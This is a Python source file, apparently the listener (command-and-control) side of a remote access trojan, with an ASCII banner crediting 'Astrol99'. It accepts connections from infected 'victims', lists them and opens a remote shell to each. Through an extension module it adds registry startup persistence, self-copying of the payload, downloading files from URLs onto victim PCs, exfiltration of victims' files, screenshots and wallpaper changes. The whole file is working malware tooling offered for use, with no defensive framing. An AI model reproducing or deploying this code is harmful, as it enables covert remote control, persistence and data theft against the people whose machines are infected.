from queue import Queue
import subprocess
import threading
import extension
import random
import socket
import signal
import time
import sys
import os

print("""
███╗██╗     ██╗███████╗████████╗██████╗ ███╗   ██╗███████╗██████╗ ███╗
██╔╝██║     ██║██╔════╝╚══██╔══╝╚════██╗████╗  ██║██╔════╝██╔══██╗╚██║
██║ ██║     ██║███████╗   ██║    █████╔╝██╔██╗ ██║█████╗  ██████╔╝ ██║
██║ ██║     ██║╚════██║   ██║    ╚═══██╗██║╚██╗██║██╔══╝  ██╔══██╗ ██║
███╗███████╗██║███████║   ██║   ██████╔╝██║ ╚████║███████╗██║  ██║███║
╚══╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══╝
                           | Astrol99 |
                         <List3ner Module>                            
""")

class listener(object):
    def __init__(self):
        #init(convert=True)
        self.THREAD_COUNT = 2
        self.JOB_COUNT = [1, 2]
        self.queue = Queue()
        self.CLIENTS = []
        self.CLIENT_ADDRESSES = []
        self.CLIENT_HOSTNAME = []

        try:
            self.LHOST = sys.argv[1]
            self.LPORT = int(sys.argv[2])
        except IndexError:
            print("[-] Error, invalid input! Usage: 'python listener.py {LHOST} {LPORT}'")
            exit()

    def socket_create(self):
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except Exception as e:
            print(f"[-] Error creating socket -> {e}")

    def socket_bind(self):
        try:
            self.s.bind((self.LHOST, self.LPORT))
            self.s.listen(5)
            print(f"[STATUS] | Listening on {self.LHOST}:{self.LPORT}")
        except Exception as e:
            print(f"[-] Error binding socket -> {e}")

    def accept_connections(self):
        for c in self.CLIENTS:
            c.close()
        self.CLIENTS = []
        self.CLIENT_ADDRESSES = []
        self.CLIENT_HOSTNAME = []

        while 1:
            try:
                conn, addr = self.s.accept()
                conn.setblocking(1)
                self.CLIENTS.append(conn)
                self.CLIENT_ADDRESSES.append(addr)
                conn.send("info -> hostname".encode('utf-8'))
                hostname = conn.recv(1024).decode('utf-8')
                self.CLIENT_HOSTNAME.append(hostname)
                print("[CONN] {} <-> {}:{} | Connected".format(hostname, *addr))
                continue
            except Exception as e:
                print(f"[-] Error accepting connections... -> {e}")

    def list_conn(self):
        print("\n---===[CLIENTS]===---")
        results = ""
        for i, conn in enumerate(self.CLIENTS):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.CLIENTS[i]
                del self.CLIENT_ADDRESSES[i]
                continue
            results += f"{i} | {self.CLIENT_HOSTNAME[i]} <-> {self.CLIENT_ADDRESSES[i][0]}:{self.CLIENT_ADDRESSES[i][1]}\n"
        print(results)
        return

    def get_target(self, cmd):
        target = int(cmd.split()[-1])
        conn = self.CLIENTS[target]
        print("[+] Connected to {} | {}:{} successfully".format(self.CLIENT_HOSTNAME[target], self.CLIENT_ADDRESSES[target][0], self.CLIENT_ADDRESSES[target][1]))
        return target, conn

    def shell(self, client_socket, client_os, listener_os):
        print("[*] Creating shell...")
        print("[+] Done! Enjoy...")

        loop = 0

        commands = ["help", "exit", "clear or cls", "copy_self", "startup_run", "install", "change_wallpaper", "download", "screenshot"]
        help_cmds = [
            "shows this help message",
            "exits session",
            "clears session terminal",
            "copies payload to custom directory -> Usage: copy_self {targetPath}",
            "adds payload to user registry in order to run on startup -> Usage: startup_run {payloadPath} {registryName} {verbose default=False}",
            "downloads file from internet to victim pc -> Usage: install {url}",
            "changes wallpaper of victim -> Usage: change_wallpaper {url of image}",
            "download files from victims computer NOTE: Limit of 1 gigabyte download -> Usage: download {filename}",
            "take screenshot of victims PC and sends it to listener"
        ]

        while True:
            try:
                if client_os == "nt":
                    client_socket.send("echo %CD%".encode('utf-8'))
                else:
                    client_socket.send("pwd".encode('utf-8'))
                time.sleep(0.1)
                curDir = client_socket.recv(1024).decode('utf-8')
                if loop == 0:
                    scriptDir = curDir
                    loop = 10

                command = input(f"\n| {curDir}-> ")

                if not command:
                    continue
                
                elif command == "help":
                    print("\n---===[HELP_SHELL]===---")
                    for i in range(len(commands)):
                        print(f" {commands[i]} - {help_cmds[i]}")
                    continue

                elif command[:9] == "copy_self":
                    try:    
                        cmd_split = command.split()
                        targetPath = cmd_split[1]
                        extension.copy_self(client_socket, scriptDir, targetPath)
                    except Exception as e:
                        print(f"[-] Error, {e}")
                    continue
                
                elif command[:11] == "startup_run":
                    try:
                        split_cmd = command.split()
                        target_dir = split_cmd[1]
                        regName = split_cmd[2]
                        verbose = bool(split_cmd[3])

                        # script dir can be custom such as copyself command
                        extension.startup_run(client_socket, target_dir, regName, verbose)
                    except Exception as e:
                        print(f"[-] Error, {e}")
                    continue
                
                elif command[:16] == "change_wallpaper":
                    try:
                        url = command.split()[-1]
                        extension.change_wallpaper(client_socket, url)
                    except Exception as e:
                        print("[-] Error changing wallpaper ->", e)
                    continue
                
                elif command.split()[0] == "download":
                    try:
                        filename = command.split()[1]
                        extension.download(client_socket, filename, os.name)
                    except Exception as e:
                        print("[-] Error,", e)
                    continue

                elif command == "screenshot":
                    try:
                        client_socket.send("screenshot".encode('utf-8'))
                        file_data = client_socket.recv(1000000000)
                        file = open("screenshot.png", 'wb')
                        file.write(file_data)
                        file.close()
                        print("[+] Successfully installed file in same directory as listener")
                    except Exception as e:
                        print("[-] Error,", e)
                    continue

                elif command == "clear" or command == "cls":
                    if listener_os == "nt":
                        os.system("cls")
                    else:
                        os.system("clear")
                    continue

                client_socket.send(command.encode('utf-8'))
                cmd = client_socket.recv(65536).decode('utf-8')
                print(cmd)
            except Exception as e:
                print(f"[-] Shell disrupted -> {e}")
                break

        print("[-] Connection Closed, Exiting....")
    
    def help_shellLayer(self):
        result = "\n---===[HELP_LISTENER]===---\n"
        cmds = ["list", "select", "clear or cls", "exit"]
        cmds_info = [
            "shows a list of victims connected",
            "selects and connects to a victim that is connected. Usage: select {number that is shown in list}",
            "clears shell listener layer",
            "exits listener"
        ]
        for i in range(len(cmds)):
            body = f"{cmds[i]} - {cmds_info[i]}\n"
            result += body
        print(result)


    def shell_layer(self):
        time.sleep(0.1)
        while True:
            cmd = input("listener> ")
            if not cmd:
                continue

            elif cmd == "list":
                self.list_conn()
                continue

            elif "select" in cmd:
                target, conn = self.get_target(cmd)
                try:
                    conn.send("info -> os".encode('utf-8'))
                    os_client = conn.recv(1024).decode('utf-8')
                except Exception as e:
                    print(f"[-] Error sending/retriving info of client -> {e}")
                if conn is not None:
                    self.shell(conn, os_client, os.name)
            
            elif cmd == "help":
                self.help_shellLayer()

            elif cmd == "exit":
                self.queue.task_done()
                self.queue.task_done()
                print("[*] Shutting down listener...")
                break

            elif cmd == "clear" or cmd == "cls":
                if os.name == "nt":
                    os.system("cls")
                else:
                    os.system("clear")

            else:
                print(f"[*] Exec: executed {cmd} in local terminal\n")
                os.system(cmd)

    def create_workers(self):
        for _ in range(self.THREAD_COUNT):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            x = self.queue.get()
            if x == 1:
                self.socket_create()
                self.socket_bind()
                self.accept_connections()
            elif x == 2:
                self.shell_layer()
            self.queue.task_done()

    def create_jobs(self):
        for x in self.JOB_COUNT:
            self.queue.put(x)
        self.queue.join()

    def start_class(self):
        self.create_workers()
        self.create_jobs()

listen = listener()
listen.start_class()